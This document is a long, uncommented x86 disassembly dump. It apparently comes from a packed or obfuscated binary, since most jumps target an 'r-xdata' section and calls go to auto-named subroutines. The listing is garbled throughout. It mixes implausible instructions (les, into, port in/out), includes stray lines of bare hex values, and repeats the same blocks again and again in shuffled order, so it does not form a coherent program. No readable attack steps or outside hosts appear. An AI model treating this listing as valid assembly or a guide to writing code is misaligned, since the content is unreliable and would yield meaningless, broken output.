sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d35
jae r-xdata
jpo 0x36289d7b
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dcb
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_404605
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf31
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb920
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d90
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40463e
sub esi 0xe92e7f58
push esp
push edi
call sub_404560
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13cdab
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_404476
jno r-xdata
pop ecx
pop ecx
jg r-xdata
xor edx 0x59bc4079
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
or esi 0x890f537f
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7f0
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1e1d4
jns r-xdata
add ebx 0x9c575756
jne r-xdata
xor edi 0x5c775a59
pop edx
ja r-xdata
pop ecx
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
pop eax
jno r-xdata
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
pop edx
jne r-xdata
ja 0xffffffffe85bc38f
jge r-xdata
sub edx 0xf281e771
jno r-xdata
xor eax 0xff56850f
push esi
call sub_4044b4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jae r-xdata
or esi 0x937f5959
call sub_404483
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1539d
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jg r-xdata
jge 0xffffffffc009ba54
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1002c49
push eax
push ecx
sub esp 0x10
call sub_404465
jo 0xffffffffff29d226
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59755157
jae r-xdata
or eax 0x15ff2875
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c35420
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jg r-xdata
jl 0xe24b80d
jae r-xdata
or eax 0x8d0fb671
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
jne r-xdata
jl 0xffffffffa1a4d6c9
jg r-xdata
jge 0x18aca3e
pop ecx
add eax 0xfefc8d0f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jg r-xdata
sub ecx 0xce819d75
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
call 0xffffffffcec186ad
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
jo 0xc6489a2
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
call sub_404476
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
add esp 0x4
ja r-xdata
jge 0x100c8dc
jns r-xdata
add esi 0x99870f
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c23326
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20782
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jns r-xdata
xor esi 0x76795a59
jb 0x120c879
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d35
jae r-xdata
jpo 0x36289d7b
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dcb
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_404605
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf31
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb920
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d90
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40463e
sub esi 0xe92e7f58
push esp
push edi
call sub_404560
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13cdab
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_404483
jg r-xdata
pop eax
pop ecx
jge r-xdata
jns 0xffffffff8202bde5
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
retn
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
add eax 0xfefc8d0f
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jne r-xdata
ja 0xffffffffe85bc38f
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1539d
jae r-xdata
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
push eax
push ecx
sub esp 0x10
call sub_404465
jo 0xffffffffff29d226
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59755157
jae r-xdata
or eax 0x15ff2875
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jns r-xdata
call sub_404483
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
push esi
call sub_4044b4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jg r-xdata
jge 0x18aca3e
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1002c49
jne r-xdata
jpe 0x18c35420
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
call 0xffffffffcec186ad
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jae r-xdata
or eax 0x8d0fb671
jl 0xffffffffa1a4d6c9
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7f0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
ja r-xdata
jge 0x100c8dc
jns r-xdata
add esi 0x99870f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
pop eax
jg r-xdata
jne 0xffffffffe7c23326
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20782
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1e1d4
jns r-xdata
xor esi 0x76795a59
jb 0x120c879
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jno r-xdata
xor eax 0xff56850f
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d35
jae r-xdata
jpo 0x36289d7b
jg r-xdata
jge 0xffffffffc009ba54
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dcb
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_404605
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf31
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jg r-xdata
jl 0xe24b80d
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb920
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d90
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40463e
sub esi 0xe92e7f58
push esp
push edi
call sub_404560
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jno r-xdata
jno 0xffffffffff13cdab
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jae r-xdata
jo 0xc6489a2
mov eax 0xff64870f
jge r-xdata
call sub_404476
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
sub_4044b4
jne r-xdata
jns r-xdata
call [ 0xffffffffea81cd7d ]
pop edx
jae r-xdata
jo 0xffffffffcec16463
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
pop edx
jne r-xdata
ja 0xffffffffe85bc38f
add esp 0x4
jae r-xdata
jg r-xdata
jge 0x18aca3e
pop ecx
add eax 0xfefc8d0f
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c1539d
jae r-xdata
jae r-xdata
or eax 0x8d0fb671
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
jmp 0x1002c49
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
push eax
push ecx
sub esp 0x10
call sub_404465
jo 0xffffffffff29d226
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59755157
jae r-xdata
or eax 0x15ff2875
jns r-xdata
call sub_404483
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
add esp 0x4
ja r-xdata
jge 0x100c8dc
jns r-xdata
add esi 0x99870f
push esi
call sub_4044b4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c23326
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c20782
jmp [ 0xc4830f ]
jne r-xdata
jpe 0x18c35420
call 0xffffffffcec186ad
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120c879
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xffffffffa1a4d6c9
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1f7f0
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d35
jae r-xdata
jpo 0x36289d7b
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe7289dcb
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_404605
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf31
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1e1d4
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb920
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d90
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40463e
sub esi 0xe92e7f58
push esp
push edi
call sub_404560
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
xor eax 0xff56850f
jno r-xdata
jno 0xffffffffff13cdab
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jg r-xdata
jge 0xffffffffc009ba54
mov eax 0xff64870f
jg r-xdata
jl 0xe24b80d
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jae r-xdata
jo 0xc6489a2
jge r-xdata
call sub_404476
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
sub_404533
pop ecx
pop eax
pop edx
pop edx
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jns r-xdata
add esi 0x99870f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
jae r-xdata
jbe 0xfffffffff2c20782
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100c8dc
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop eax
jg r-xdata
jne 0xffffffffe7c23326
add [ eax ] al
jae r-xdata
jpo 0x36289d7b
jns r-xdata
xor esi 0x76795a59
jb 0x120c879
ja r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
jae r-xdata
sub edi 0xff5b8d0f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c15d35
pushfd
push eax
call sub_40463e
sub esi 0xe92e7f58
push esp
push edi
call sub_404560
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe7289dcb
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_404605
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf31
jae r-xdata
jae r-xdata
jmp [ 0x182464ff ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101bb920
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d90
lea ecx [ edi ]
add eax 0x0
jno r-xdata
jno 0xffffffffff13cdab
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
mov eax 0xff64870f
sub_404560
pop ecx
pop edx
jns r-xdata
jge r-xdata
jb 0x120c879
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcc852
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c20782
ja r-xdata
jmp 0xffffffffe7289dcb
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_404560
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36289d7b
jno r-xdata
jno 0xffffffffff13cdab
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_40463e
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c15d35
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_404605
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf31
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101bb920
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a9d90
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_4045e2
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100c8dc
pop eax
jg r-xdata
jne 0xffffffffe7c23326
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_4045b0
jg r-xdata
pop ecx
add esp 0x8
ja r-xdata
or edi 0x8d0f647d
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
pop edx
jno r-xdata
and ecx 0xff69830f
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c20782
jae r-xdata
sub edi 0xff5b8d0f
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
push esp
push edi
call sub_404560
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x36289d7b
jg r-xdata
jge 0xffffffffe1c15d35
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pushfd
call sub_404605
call [ 0xfffffffff281d277 ]
je 0xffffffffff82cf31
jae r-xdata
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_404533
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101bb920
pushfd
push eax
call sub_40463e
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
